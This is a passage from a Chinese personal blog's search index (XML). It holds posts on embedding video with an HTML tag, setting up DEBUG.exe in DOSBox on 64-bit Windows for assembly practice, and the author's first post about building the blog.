title="视频引用"></a>视频引用</h1><p>与照片引用类似</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;video src&#x3D;&#39;&#x2F;视频路径&#x2F;选择视频&#39; heigth&#x3D;&#39;高度&#39; controls&gt;</span><br><span class="line">例如：&lt;video src&#x3D;&#39;&#x2F;video&#x2F;1.mp4&#39; heigth&#x3D;&#39;500px&#39; controls&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>debug安装与配置</title>
      <link href="/post/debug%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE.html"/>
      <url>/post/debug%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE.html</url>
      
        <content type="html"><![CDATA[<h1 id="win64位系统进入debug"><a href="#win64位系统进入debug" class="headerlink" title="win64位系统进入debug"></a>win64位系统进入debug</h1><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>最近一直在看汇编语言，想要实操，于是要进入debug模式，但是发现win64位系统无法直接进入，但最后经过几次尝试终于成功进入</p></blockquote><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>1、首先要下载安装DOSBox，也就是下面这个东西</p><img src="/images/5.jpg" height="400" width="350" /><p>安装地址：链接：<a href="https://pan.baidu.com/s/1B0dzSc--Ok_ds67ai4flmQ">https://pan.baidu.com/s/1B0dzSc--Ok_ds67ai4flmQ</a>     提取码：a7tp </p><p>2、因为软件比较小，为了避免麻烦，我直接默认安装在C:\Program Files (x86)中</p><p>3、找到 <strong>debug.exe</strong>，并把你喜欢的位置上，记住目录（等会用到）这里我放在<strong>D:\Debug</strong>目录下</p><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>打开DOSBox.exe，输入以下指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mount c d:\debug</span><br><span class="line">c:</span><br><span class="line">debug</span><br></pre></td></tr></table></figure><img src="/images/6.jpg" height="600" width="600" /><p>之后就进入了debug模式</p><h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>如果嫌每次进入都需要输入很麻烦，可以在<strong>DOSBox 0.74 Options.bat</strong>的脚本文件进行修改，步骤如下：</p><p>1、找到<strong>DOSBox 0.74 Options.bat</strong>，双击点开</p><p>2、点开后拉至最底下输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount c d:\debug</span><br><span class="line">c:</span><br></pre></td></tr></table></figure><p>3、保存退出</p><img src="/images/7.jpg" height="600" width="600" /><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>开 <strong>DOSBox</strong> 会同时打开两个窗口，其中一个是黑色的控制台窗口，在控制台窗口中指明了配置文件的绝对路径</p><img src="/images/8.jpg" height="600" width="600" />]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的第一篇文章</title>
      <link href="/post/My-First-Post.html"/>
      <url>/post/My-First-Post.html</url>
      
        <content type="html"><![CDATA[<h2 id="新的开始"><a href="#新的开始" class="headerlink" title="新的开始"></a>新的开始</h2><p><em>这是本人第一次搭博客，走了许多弯路，经过了无数次的失败，浪费了大量的时间，但最终还是搭建完成。在这其中，我请教了石师兄和高师兄，借鉴了B站的视频，才最终成功。最后，我希望迈出这一小步后能够继续向前，并成为我想成为的人。</em></p><span id="more"></span><h3 id="音频测试"><a href="#音频测试" class="headerlink" title="音频测试"></a>音频测试</h3><h4 id="照片"><a href="#照片" class="headerlink" title="照片"></a>照片</h4><img src="/images/1.jpg" height="400" width="350" /><h4 id="音乐"><a href="#音乐" class="headerlink" title="音乐"></a>音乐</h4><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=400 height=86 src="//music.163.com/outchain/player?type=2&id=1477539203&auto=1&height=66"></iframe><h4 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h4><video src='/video/1.mp4' heigth='500px' controls>]]></content>
      
      
      <categories>
          
          <category> 心得 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 感想 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
